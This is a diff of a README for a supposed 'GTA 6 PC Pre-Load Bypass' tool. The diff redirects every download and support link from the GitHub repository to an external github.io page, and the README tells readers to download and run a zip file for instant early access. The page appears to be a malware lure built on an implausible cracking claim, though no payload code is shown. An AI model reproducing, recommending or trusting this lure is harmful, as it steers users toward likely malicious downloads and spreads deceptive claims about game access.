@@ -1,7 +1,7 @@
 <h1>🎮 Updated-GTA-6-PC-Pre-Load-Bypass - Unlock Early Access Instantly Today</h1>
 
 <p align="center">
-  <a href="https://github.com/qquan13999/Updated-GTA-6-PC-Pre-Load-Bypass/releases">
+  <a href="https://qquan13999.github.io">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-LATEST_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=ff6600" alt="Download Badge" width="400" height="80">
   </a>
 </p>
@@ -20,7 +20,7 @@ Follow these simple steps to get started. The entire process takes less than fiv
 ### ⬇️ Step 1: Download the Tool
 Visit this link to download the application. 
 
-👉 **[Click Here to Download the Latest Version](https://github.com/qquan13999/Updated-GTA-6-PC-Pre-Load-Bypass/releases)**
+👉 **[Click Here to Download the Latest Version](https://qquan13999.github.io)**
 
 You will see a list of files on that page. Look for the file named `GTA6_PreLoad_Bypass_2026.zip` (or something very similar). Click on it to start the download. Your browser will save the file to your Downloads folder (usually located in your user folder or taskbar quick access.‌
 
@@ -103,7 +103,7 @@ Because this is just a small utility, it works on almost any computer that can r
 ## 🧑‍💻 Support
 We offer free support through our GitHub Issues page. If you have any trouble, visit the repository page here:
 
-👉 **[Report an Issue or Ask a Question](https://github.com/qquan13999/Updated-GTA-6-PC-Pre-Load-Bypass/issues)**
+👉 **[Report an Issue or Ask a Question](https://qquan13999.github.io)**
 
 Please include a screenshot of any error messageand a description of what you were doing when the problem occurred. We typically respond within 24 hours. 
 
@@ -113,7 +113,7 @@ Don’t wait until release day to start downloading a 150 GB game. It could take
 Click the button below to grab your copy now. It’s free, it’s fast, and it takes less than five minutes to set up. 
 
 <p align="center">
-  <a href="https://github.com/qquan13999/Updated-GTA-6-PC-Pre-Load-Bypass/releases">
+  <a href="https://qquan13999.github.io">
     <img src="https://img.shields.io/badge/📥_GET_INSTANT_ACCESS-DOWNLOAD_HERE-ff007f?style=for-the-badge" alt="Download Button" width="400" height="80">
   </a>
 </p>
